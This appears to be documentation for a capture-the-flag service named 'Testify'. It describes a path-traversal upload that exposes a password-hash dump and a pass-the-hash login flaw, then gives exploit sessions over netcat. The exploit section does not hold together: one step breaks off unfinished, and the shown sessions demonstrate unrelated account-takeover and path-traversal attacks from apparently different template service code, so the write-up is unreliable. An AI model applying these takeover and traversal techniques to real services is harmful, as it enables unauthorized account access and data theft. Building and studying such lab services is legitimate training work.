Testify Service documentation
======================

# <ins>Vulnerabilities

The Testify Service consists of two different Vulnerabilities which must be exploited after each other to get access 
to the FLAGSTORE

## VULN #1: User Password Hash Exposure

- Category: Sensitive Data Exposure
- Difficulty: Medium

When registering a new user, a `.sql` dump file of the user database containing the password hashes is created.  
The attacker can retrieve this dump file by using a modified file name when uploading his ID in the appointments section.

## VULN #2: Pass-The-Hash

- Category: Authentication
- Difficulty: Medium

The password is not allowed to contain any special characters other than ASCII. If the user passes a password string,
that does include non-ASCII characters (*e.g. a password hash obtained by VULN#1*) the hashing of the input password string 
is skipped and directly compared to the hash in the user credential databse.



# <ins>Exploits

Two different exploits for VULN#1 and VULN#2 need to be run after each other to obtain a flag.

## VULN #1 :

1. Make an appointment containing a file with arbitrary content but using the filename `../online_users/dump.sql`
2. In the appointments overview section 

## Account Takeover

Connect to the service and use the `user` command to obtain a list of users:

```
gehaxelt@LagTop ~ [130]> nc 192.168.2.112 2323
Welcome to the 1337 testify!
> user
User 0: test
User 1: foo
User 2: 4FOBMO10HWLC
User 3: I4K3P0SK3PST
User 4: B70YKMW72KUR
User 5: GB7QC0DKYXPS
User 6: NXPTITQUSN2M
User 7: 6699DPYPAQDL
User 8: MPG81XWFHNE8
User 9: QN973IXF53HT
User 10: UI2WTY7E7KC5
User 11: XXPLIXZ9ZN1Q
User 12: N43LU1348D19
User 13: 3DP6COPE6GMX
User 14: I8ZUNTWZ0Y0Q
User 15: JUACZ5J3D475
User 16: KGFZNGHROLUS
User 17: FV9VM13K8MGF
User 18: XAHOKR4QD63O
```

Use the username(s) and the `reg` command to set a different password. Next, `log`in as the user, `list` their notes and obtain the flag:

```
> reg XAHOKR4QD63O foo
User successfully registered
> log XAHOKR4QD63O foo
Successfully logged in!
> list 
Note 0: 199480a3640248d5ea679b596d91c350
> get 199480a3640248d5ea679b596d91c350
SKLNAYZAG7QX65RTMW3DCZAKPS9OC0TFH6GH
```

## Arbitrary Read or Write (Account Takeover v2)

Connect to the service and list all users:

```
gehaxelt@LagTop ~/C/A/e/service-example (cleanup)> nc 192.168.2.112 2323
Welcome to the 1337 testify!
> users
User 0: 0WTC89S0Y67Y
User 1: HWG5RBYEQX3Y
User 2: XK2UJAC7KWMB
User 3: CF8TFV304DMO
User 4: E9XAV2ACHRY0
User 5: SHBSC21EC963
User 6: AC1MSHQS7HE8
User 7: OVTN3ZXRO7X0
User 8: IM03X7OWDEV7
User 9: NQST4C3ABWLD
User 10: VS7ZY06LELHI
User 11: WFS6JGH8DDYO
User 12: WBAYX5MLDMIG
User 13: H4YXGNP9D3GS
User 14: S735UCC1O7FE
User 15: foo
```

Use the username(s) and the `reg` command to set a new password by abusing the path traversal bug:

```
gehaxelt@LagTop ~/C/A/e/service-example (cleanup)> nc 192.168.2.112 2323
Welcome to the 1337 testify!
> reg ../users/foo bar
User successfully registered
> log foo bar
Successfully logged in!
> list
Note 0: 581f1b0f439b22d1d2c617d1e8963505
> get 581f1b0f439b22d1d2c617d1e8963505
ENOTESTFLAG
```